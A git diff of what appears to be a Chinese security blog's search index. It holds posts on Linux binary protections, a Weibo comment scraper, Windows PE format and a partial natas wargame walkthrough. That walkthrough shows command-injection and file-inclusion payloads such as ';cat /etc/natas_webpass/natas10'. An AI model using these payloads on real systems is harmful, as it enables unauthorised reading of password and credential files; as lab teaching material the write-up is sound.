+<p>作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>了解以上内存保护机制的信息会为我们pwn提供一些信息。</p>
+]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>程序保护机制</tag>
+        <tag>Pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -171,41 +230,296 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux程序保护机制</title>
-    <url>/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="Linux程序保护机制"><a href="#Linux程序保护机制" class="headerlink" title="Linux程序保护机制"></a>Linux程序保护机制</h1><p>​    在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:)</p>
-<h2 id="Tools-checksec"><a href="#Tools-checksec" class="headerlink" title="Tools:checksec"></a>Tools:checksec</h2><p>checksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo:  题目:flag</p>
-<p><img src="https://i.loli.net/2021/04/18/kOGJRsePqZuj2AM.png" alt="图片.png"></p>
-<p>下面对逐个介绍保护机制</p>
-<h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>​    在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。</p>
-<p>​    Function：</p>
-<p>1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作<br>“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。</p>
-<p>2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。</p>
-<p>3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。</p>
-<p>4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。</p>
-<p>5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。</p>
-<p><img src="https://i.loli.net/2021/04/18/InOpchLTMduiEj6.png" alt="6.png"></p>
-<p><img src="https://i.loli.net/2021/04/18/oFnTNEWy9baQixr.png" alt="7.jpg"></p>
-<h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>FORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。</p>
-<p>在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。</p>
-<p>gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度</p>
-<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX:no-excute不可执行</p>
-<p>基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
-<p><img src="https://i.loli.net/2021/04/18/phJd1xmej7unXZE.png" alt="8.jpg"></p>
-<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作</p>
-<h2 id="内存地址随机化机制几种情况："><a href="#内存地址随机化机制几种情况：" class="headerlink" title="内存地址随机化机制几种情况："></a>内存地址随机化机制几种情况：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
-<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO:read only relocation </p>
-<p>由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p>
-<p>作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
-<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>了解以上内存保护机制的信息会为我们pwn提供一些信息。</p>
+    <title>Python微博评论爬取</title>
+    <url>/2021/06/04/Python%E7%88%AC%E8%99%AB/</url>
+    <content><![CDATA[<h1 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h1><ul>
+<li>用于爬取某一具体微博的所有评论</li>
+<li>通过<a href="https://m.weibo.com/">https://m.weibo.com</a> 查看指定微博id号</li>
+<li>修改cookie</li>
+</ul>
+<h1 id="Source-code"><a href="#Source-code" class="headerlink" title="Source_code"></a>Source_code</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> requests.sessions <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化参数说明：填入自己cookie、以及被爬取微博id即可</span></span><br><span class="line">weibo_id=<span class="number">4643338235416902</span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;Your_own_cookie&#x27;</span><span class="comment">#设置为自己的cookie</span></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span> : <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://m.weibo.cn/detail/4635403158556543&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-XSRF-TOKEN&#x27;</span> : <span class="string">&#x27;5c0faa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MWeibo-Pwa&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;微博评论.csv&quot;</span>,mode =<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"><span class="comment">#打开csv文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id_type=0&quot;</span>.<span class="built_in">format</span>(weibo_id,weibo_id)</span><br><span class="line">session = requests.Session()</span><br><span class="line">resp = session.get(url, headers=headers)</span><br><span class="line"><span class="built_in">dict</span> = resp.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>])):</span><br><span class="line">    comment = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">    name = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;screen_name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    csvwriter.writerow([name,comment])</span><br><span class="line"></span><br><span class="line">max_id_type =  <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id_type&#x27;</span>]</span><br><span class="line">max_id = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;now max_id=&quot;</span>+<span class="built_in">str</span>(max_id))</span><br><span class="line">flag_ok=<span class="built_in">dict</span>[<span class="string">&#x27;ok&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(flag_ok)</span><br><span class="line">flag_time=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(flag_ok==<span class="number">1</span> <span class="keyword">and</span> max_id!=<span class="number">0</span>):</span><br><span class="line">    url = <span class="string">&quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id=&#123;&#125;&amp;max_id_type=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(weibo_id,weibo_id,max_id,max_id_type)</span><br><span class="line">    resp = session.get(url,headers=headers)</span><br><span class="line">    <span class="built_in">dict</span> = resp.json()</span><br><span class="line">    flag_time= flag_time+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(flag_time==<span class="number">10</span>):</span><br><span class="line">        flag_time=<span class="number">0</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Now relax for 2s to avoid 反扒机制. Be patient :)&quot;</span>)</span><br><span class="line">    flag_ok=<span class="built_in">dict</span>[<span class="string">&#x27;ok&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;now max_id=&quot;</span>+<span class="built_in">str</span>(max_id))</span><br><span class="line">    <span class="keyword">if</span>(flag_ok==<span class="number">1</span>):</span><br><span class="line">        max_id = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id&#x27;</span>]</span><br><span class="line">        max_id_type =  <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id_type&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>])):</span><br><span class="line">            comment = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">            name = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;screen_name&#x27;</span>]  </span><br><span class="line">            wb_time=<span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;created_at&#x27;</span>]</span><br><span class="line">            csvwriter.writerow([name,comment,wb_time])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>linux</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>程序保护机制</tag>
-        <tag>Pwn</tag>
+        <tag>Python</tag>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web题解_natas</title>
+    <url>/2021/04/20/Web_1/</url>
+    <content><![CDATA[<h1 id="Web题解-natas"><a href="#Web题解-natas" class="headerlink" title="Web题解_natas"></a>Web题解_natas</h1><p>Easy_web入门刷题</p>
+<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level_0"></a><strong>Level_0</strong></h2><p>Check Souce code</p>
+<h2 id="Level-0➡Level-1"><a href="#Level-0➡Level-1" class="headerlink" title="Level_0➡Level_1"></a><strong>Level_0➡Level_1</strong></h2><p>Check Souce code</p>
+<h2 id="Level-1➡Level-2"><a href="#Level-1➡Level-2" class="headerlink" title="Level_1➡Level_2"></a><strong>Level_1➡Level_2</strong></h2><p>发现有个png图片，访问上级目录可查看到有flag的txt文档</p>
+<h2 id="Level-2➡Level-3"><a href="#Level-2➡Level-3" class="headerlink" title="Level_2➡Level_3"></a><strong>Level_2➡Level_3</strong></h2><h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a><strong>Robots协议</strong></h2><p>访问/robots.txt查看到存在目录/s3cr3t/访问即可得到flag</p>
+<h2 id="Level-3➡Level-4"><a href="#Level-3➡Level-4" class="headerlink" title="Level_3➡Level_4"></a><strong>Level_3➡Level_4</strong></h2><p>根据提示用Burpsuite抓包改HTTPReferer发送即可</p>
+<h2 id="Level-4➡Level-5"><a href="#Level-4➡Level-5" class="headerlink" title="Level_4➡Level_5"></a><strong>Level_4➡Level_5</strong></h2><h2 id="Learn-about-cookie"><a href="#Learn-about-cookie" class="headerlink" title="Learn about cookie"></a><strong>Learn about cookie</strong></h2><p>更改cookie中Loggedin 值为1即可</p>
+<h2 id="Level-5➡Level-6"><a href="#Level-5➡Level-6" class="headerlink" title="Level_5➡Level_6"></a><strong>Level_5➡Level_6</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;includes/secret.inc&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$secret</span> == <span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现导入了”includes/secret.inc” ，比较的时候访问该目录可看到密码，提交即可</p>
+<h2 id="Level-6➡Level-7"><a href="#Level-6➡Level-7" class="headerlink" title="Level_6➡Level_7"></a><strong>Level_6➡Level_7</strong></h2><p>include()文件包含漏洞，用户传入的page参数未经过滤直接调用include()函数，传入/etc/natas_webpass/natas8作为参数即可。</p>
+<h2 id="Level-7➡Level-8"><a href="#Level-7➡Level-8" class="headerlink" title="Level_7➡Level_8"></a><strong>Level_7➡Level_8</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encodedSecret</span> = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(strrev(base64_encode(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(encodeSecret(<span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) == <span class="variable">$encodedSecret</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据加密过程解密即可</p>
+<p>练习一下python</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">byte=<span class="string">b&#x27;\x3d\x3d\x51\x63\x43\x74\x6d\x4d\x6d\x6c\x31\x56\x69\x56\x33\x62&#x27;</span></span><br><span class="line">t=byte.decode()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">t=t[::-<span class="number">1</span>]<span class="comment">#字符切片</span></span><br><span class="line"><span class="built_in">print</span>(t) </span><br><span class="line">t=base64.b64decode(t)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
+<p>练习一下linux命令</p>
+<p>优雅简洁:)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d</span><br></pre></td></tr></table></figure>
+<p><em>-r</em> | <em>-revert</em></p>
+<p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. <strong>Use the combination <em>-r</em> -p to read plain hexadecimal dumps without line number information and without a particular column layout.</strong> Additional Whitespace and line-breaks are allowed anywhere.</p>
+<h2 id="Level-8➡Level-9"><a href="#Level-8➡Level-9" class="headerlink" title="Level_8➡Level_9"></a><strong>Level_8➡Level_9</strong></h2><h2 id="Learn-about-passthru"><a href="#Learn-about-passthru" class="headerlink" title="Learn about passthru()"></a><strong>Learn about passthru()</strong></h2><p>passtru():exec() 函数类似， passthru() 函数也是用来执行外部命令（ command ）的。 </p>
+<p>用户输入未过滤，直接用 ; 截断grep 命令cat flag</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;cat /etc/natas_webpass/natas10</span><br></pre></td></tr></table></figure>
+<h2 id="Level-9➡Level-10"><a href="#Level-9➡Level-10" class="headerlink" title="Level_9➡Level_10"></a><strong>Level_9➡Level_10</strong></h2><p>注意到对用户输入进行过滤，但只是过滤了; | &amp;特殊字符</p>
+<h2 id="Uage-of-grep-and-regex"><a href="#Uage-of-grep-and-regex" class="headerlink" title="Uage of grep and regex"></a><strong>Uage of grep and regex</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&#x27;[A-Za-z]&#x27;</span> 文件名</span><br></pre></td></tr></table></figure>
+<p>Demo:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[a-zA-Z] /etc/natas_webpass/natas11</span><br><span class="line">Or</span><br><span class="line">. /etc/natas_webpass/natas11</span><br></pre></td></tr></table></figure>
+<h2 id="Level-10➡Level-11"><a href="#Level-10➡Level-11" class="headerlink" title="Level_10➡Level_11"></a><strong>Level_10➡Level_11</strong></h2><h2 id="Level-11➡Level-12"><a href="#Level-11➡Level-12" class="headerlink" title="Level_11➡Level_12"></a><strong>Level_11➡Level_12</strong></h2><h2 id="Level-12➡Level-13"><a href="#Level-12➡Level-13" class="headerlink" title="Level_12➡Level_13"></a><strong>Level_12➡Level_13</strong></h2><h2 id="Level-13➡Level-14"><a href="#Level-13➡Level-14" class="headerlink" title="Level_13➡Level_14"></a><strong>Level_13➡Level_14</strong></h2><h2 id="Level-14➡Level-15"><a href="#Level-14➡Level-15" class="headerlink" title="Level_14➡Level_15"></a><strong>Level_14➡Level_15</strong></h2><h2 id="Level-15➡Level-16"><a href="#Level-15➡Level-16" class="headerlink" title="Level_15➡Level_16"></a><strong>Level_15➡Level_16</strong></h2><h2 id="Level-16➡Level-17"><a href="#Level-16➡Level-17" class="headerlink" title="Level_16➡Level_17"></a><strong>Level_16➡Level_17</strong></h2><h2 id="Level-17➡Level-18"><a href="#Level-17➡Level-18" class="headerlink" title="Level_17➡Level_18"></a><strong>Level_17➡Level_18</strong></h2><h2 id="Level-18➡Level-19"><a href="#Level-18➡Level-19" class="headerlink" title="Level_18➡Level_19"></a><strong>Level_18➡Level_19</strong></h2><h2 id="Level-19➡Level-20"><a href="#Level-19➡Level-20" class="headerlink" title="Level_19➡Level_20"></a><strong>Level_19➡Level_20</strong></h2><h2 id="Level-20➡Level-21"><a href="#Level-20➡Level-21" class="headerlink" title="Level_20➡Level_21"></a><strong>Level_20➡Level_21</strong></h2><h2 id="Level-21➡Level-22"><a href="#Level-21➡Level-22" class="headerlink" title="Level_21➡Level_22"></a><strong>Level_21➡Level_22</strong></h2><h2 id="Level-22➡Level-23"><a href="#Level-22➡Level-23" class="headerlink" title="Level_22➡Level_23"></a><strong>Level_22➡Level_23</strong></h2><h2 id="Level-23➡Level-24"><a href="#Level-23➡Level-24" class="headerlink" title="Level_23➡Level_24"></a><strong>Level_23➡Level_24</strong></h2><h2 id="Level-24➡Level-25"><a href="#Level-24➡Level-25" class="headerlink" title="Level_24➡Level_25"></a><strong>Level_24➡Level_25</strong></h2><h2 id="Level-25➡Level-26"><a href="#Level-25➡Level-26" class="headerlink" title="Level_25➡Level_26"></a><strong>Level_25➡Level_26</strong></h2><h2 id="Level-26➡Level-27"><a href="#Level-26➡Level-27" class="headerlink" title="Level_26➡Level_27"></a><strong>Level_26➡Level_27</strong></h2><h2 id="Level-27➡Level-28"><a href="#Level-27➡Level-28" class="headerlink" title="Level_27➡Level_28"></a><strong>Level_27➡Level_28</strong></h2><h2 id="Level-28➡Level-29"><a href="#Level-28➡Level-29" class="headerlink" title="Level_28➡Level_29"></a><strong>Level_28➡Level_29</strong></h2><h2 id="Level-29➡Level-30"><a href="#Level-29➡Level-30" class="headerlink" title="Level_29➡Level_30"></a><strong>Level_29➡Level_30</strong></h2><h2 id="Level30➡Level31"><a href="#Level30➡Level31" class="headerlink" title="Level30➡Level31"></a><strong>Level<em>30➡Level</em></strong>31</h2><h2 id="Level-31➡Level-32"><a href="#Level-31➡Level-32" class="headerlink" title="Level_31➡Level_32"></a><strong>Level_31➡Level_32</strong></h2><h2 id="Level-32➡Level-33"><a href="#Level-32➡Level-33" class="headerlink" title="Level_32➡Level_33"></a><strong>Level_32➡Level_33</strong></h2><h2 id="Level33➡Level34"><a href="#Level33➡Level34" class="headerlink" title="Level33➡Level34"></a><strong>Level<em>33➡Level</em></strong>34</h2>]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows_PE文件格式</title>
+    <url>/2021/04/22/Windows_PE%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="Windows-PE文件格式"><a href="#Windows-PE文件格式" class="headerlink" title="Windows_PE文件格式"></a>Windows_PE文件格式</h1><p>​    PE文件格式是理解Windows操作系统进程、内存、动态链接库加载的基础，本文结合逆向课所学和查询的资料简单做个总结。</p>
+<h2 id="1-PE文件基本介绍"><a href="#1-PE文件基本介绍" class="headerlink" title="1.PE文件基本介绍"></a><strong>1.PE文件基本介绍</strong></h2><p>PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。</p>
+<h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a><strong>基本结构</strong></h2><p> 从DOS头到节区头是PE头部分，其下的节区合称为PE体。</p>
+<ol>
+<li><p><strong>DOS头</strong></p>
+<p>主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。</p>
+<p>大小为64字节，其中2个重要的成员分别是：</p>
+<ul>
+<li>e_magic:DOS签名（4D5A，MZ）</li>
+<li>e_lfanew：指示NT头的偏移（文件不同，值不同）</li>
+</ul>
+</li>
+<li><p><strong>DOS存根</strong></p>
+<p>stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。</p>
+</li>
+<li><p><strong>NT头</strong></p>
+<p>结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成：</p>
+<ul>
+<li>签名结构体，值为50450000h（“PE”00）</li>
+<li>文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个：<ul>
+<li>Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C；</li>
+<li>NumberOfSections：指出文件中存在的节区数量；</li>
+<li>SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度</li>
+<li>Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合</li>
+</ul>
+</li>
+<li>可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个：<ul>
+<li>Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B</li>
+<li><strong>AddressOfEntryPoint</strong>：持有EP的RVA值，指出程序最先执行的代码起始地址</li>
+<li>ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF）</li>
+<li>SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位</li>
+<li>SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小</li>
+<li>SizeOfHeaders：指出整个PE头的大小</li>
+<li>Subsystem：区分系统驱动文件和普通可执行文件</li>
+<li>NumberOfRvaAndSize：指定DataDirectory数组的个数</li>
+<li><strong>DataDirectory</strong>：<strong>由IMAGE_DATA_DIRECTORY结构体组成的数组</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>节区头</strong></p>
+<p>节区头定义了各节区的属性。PE文件中code、data、resource等按照属性储存在不同的节区。好处是可以保证程序的安全性，将代码和数据分隔开，每个节区设计不同的访问权限。</p>
+<p>| 类别     | 访问权限权限     |<br>| ———— | ———————— |<br>| code     | 执行、读取权限   |<br>| data     | 非执行、读写权限 |<br>| resource | 非执行、读取权限 |</p>
+<p>节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个：</p>
+<ul>
+<li>VirtualSize：内存中节区所占大小</li>
+<li>VirtualAddress：内存中节区起始地址（RVA）</li>
+<li>SizeOfRawData：磁盘文件中节区所占大小</li>
+<li>Charateristics：节区属性（bit OR）</li>
+</ul>
+</li>
+</ol>
+<h2 id="内存映射-RVA-to-RAW"><a href="#内存映射-RVA-to-RAW" class="headerlink" title="内存映射(RVA_to_RAW)"></a><strong>内存映射(RVA_to_RAW)</strong></h2><p>左边文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如下图所示）。</p>
+<p><img src="https://i.loli.net/2021/04/22/tuVd4UL9BONoP2K.png" alt="102.jpg"></p>
+<p>VA: Virtual Address 进程虚拟内存绝对地址</p>
+<p>RVA: Relative Virtual Address 相对虚拟地址，指从某个基准位置开始的相对地址</p>
+<p>ImageBase: PE文件的优先装载地址</p>
+<p>转换关系如下：</p>
+<script type="math/tex; mode=display">
+RVA+ImageBase=VA</script><p><strong>Why use VA and RVA?</strong></p>
+<p>PE头内部信息大多以RVA形式存在。PE文件（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件。此时必须通过重定位将其加载到其他空白位置，若PE头用的是VA，则会造成无法正常访问。因此使用RVA来定位信息，即使发生重定位，只要相对于基准的相对地址没有发生变化，就能正常访问到指定信息不会发生问题。</p>
+<p>Demo:</p>
+<p>If RVA=5000,  File Offset=?</p>
+<p>①首先查找RVA对应所在的节区</p>
+<p>→位于第一个节区(.text)  图中ImageBase(01000000)</p>
+<p>②计算公式</p>
+<p>→</p>
+<script type="math/tex; mode=display">
+RAW=RVA-VirtualAddress+PointerToRawData\\
+=5000-1000+400=4400</script><h2 id="2-What’s-IAT"><a href="#2-What’s-IAT" class="headerlink" title="2.What’s IAT"></a><strong>2.What’s IAT</strong></h2><p>IAT: Import Address Table 导入地址表。</p>
+<p>这个表保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p>
+<p>先了解一下Windows的DDL</p>
+<p>DLL：Dynamic Linked Library 动态链接库</p>
+<ol>
+<li>不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。</li>
+<li>使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。</li>
+<li>在对函数库进行更新时，只更新DLL文件，简单易行</li>
+</ol>
